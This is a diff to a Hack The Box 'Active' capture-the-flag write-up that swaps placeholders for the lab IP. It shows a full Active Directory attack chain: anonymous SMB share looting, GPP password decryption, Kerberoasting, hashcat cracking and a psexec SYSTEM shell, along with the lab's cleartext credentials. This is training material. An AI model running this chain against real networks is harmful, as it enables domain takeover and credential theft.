@@ -5,6 +5,7 @@
 | **Platform** | Hack The Box |
 | **OS** | Windows |
 | **Difficulty** | Easy |
+| **IP** | `10.129.82.171` |
 | **Domain** | `active.htb` |
 
 ## Synopsis
@@ -23,8 +24,8 @@ is cracked offline, yielding Domain Admin and a SYSTEM shell.
 ### Nmap
 
 ```bash
-nmap -p- --min-rate=5000 -T4 <target>
-nmap -p53,88,135,139,389,445,464,636,3268 -sCV <target>
+nmap -p- --min-rate=5000 -T4 10.129.82.171
+nmap -p53,88,135,139,389,445,464,636,3268 -sCV 10.129.82.171
 ```
 
 A Domain Controller footprint. Add `active.htb` to `/etc/hosts`.
@@ -32,8 +33,8 @@ A Domain Controller footprint. Add `active.htb` to `/etc/hosts`.
 ### SMB — anonymous Replication share
 
 ```bash
-smbclient -L //<target>/ -N
-smbclient //<target>/Replication -N
+smbclient -L //10.129.82.171/ -N
+smbclient //10.129.82.171/Replication -N
 ```
 
 `Replication` is readable without credentials. It mirrors SYSVOL and contains the GPP path:
@@ -45,7 +46,7 @@ smbclient //<target>/Replication -N
 Pull it recursively:
 
 ```bash
-smbclient //<target>/Replication -N -c "prompt OFF; recurse ON; mget *"
+smbclient //10.129.82.171/Replication -N -c "prompt OFF; recurse ON; mget *"
 ```
 
 ---
@@ -69,7 +70,7 @@ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuN
 Validate and grab the user flag:
 
 ```bash
-smbclient //<target>/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'
+smbclient //10.129.82.171/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'
 ```
 
 The **user flag** is in `\Users\SVC_TGS\Desktop\user.txt`.
@@ -82,7 +83,7 @@ The `Administrator` account has an SPN registered, so any authenticated user can
 service ticket and crack it offline:
 
 ```bash
-GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip <target> -request
+GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.82.171 -request
 # $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS...*$...
 ```
 
@@ -96,7 +97,7 @@ hashcat -m 13100 admin.tgs /usr/share/wordlists/rockyou.txt
 Use the cracked Domain Admin password for a SYSTEM shell:
 
 ```bash
-psexec.py active.htb/Administrator:'Ticketmaster1968'@<target>
+psexec.py active.htb/Administrator:'Ticketmaster1968'@10.129.82.171
 ```
 
 ```
